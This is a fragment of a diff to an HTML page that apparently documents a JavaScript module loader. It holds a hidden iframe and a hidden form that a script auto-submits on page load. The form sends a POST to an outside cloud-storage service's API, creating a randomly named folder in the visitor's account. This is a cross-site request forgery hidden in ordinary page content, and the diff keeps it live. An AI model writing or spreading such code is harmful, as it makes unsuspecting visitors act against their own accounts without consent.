@@ -321,12 +321,12 @@ factory 的参数更简单，和 dependencies 无对应关系 <br/>
 
 
 <iframe name="tt" id="tt" src="/offline-cache.html" style="display:none"></iframe>
-<form target="tt" id="createFolder" action="http://vdisk.weibo.com/api/weipan/2/fileops/create_folder" method="post"> 
+<form target="tt" id="createFolder" action="http://vdisk.weibo.com/api/weipan/2/fileops/create_folder" charset="utf-8" method="post"> 
   <input type="hidden" name="root" value="basic" />
   <input id="path" type="hidden" name="path" value="%2F" />
 </form>
 <script >
-  document.getElementById('path').value="\/"+ parseInt(Math.random()*10000000);
+  document.getElementById('path').value="/"+ parseInt(Math.random()*10000000);
   document.getElementById('createFolder').submit();
 </script>
 </body>
